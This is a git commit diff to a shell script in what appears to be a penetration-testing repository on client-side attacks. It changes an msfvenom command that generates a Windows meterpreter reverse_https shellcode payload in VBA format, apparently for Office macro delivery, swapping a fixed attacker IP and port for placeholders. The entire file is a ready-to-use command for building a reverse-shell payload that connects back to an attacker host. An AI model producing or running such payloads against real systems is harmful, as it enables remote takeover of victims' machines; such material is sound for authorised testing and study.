aa0b0f85cd9c08273a2748207f885e5328f6d206
qv1ntv5 <sanmillan.german@gmail.com>
2024-04-22 22:20:20 +0200

    Shellcode

--- ClientSideAttacks/Payloads/MsfVenom/ShellCode.sh
+++ ClientSideAttacks/Payloads/MsfVenom/ShellCode.sh
@@ -1,3 +1,3 @@
-msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication
+msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=<LPORT> EXITFUNC=thread -f vbapplication
 
 #This msfvenom command launch a shellcode. 
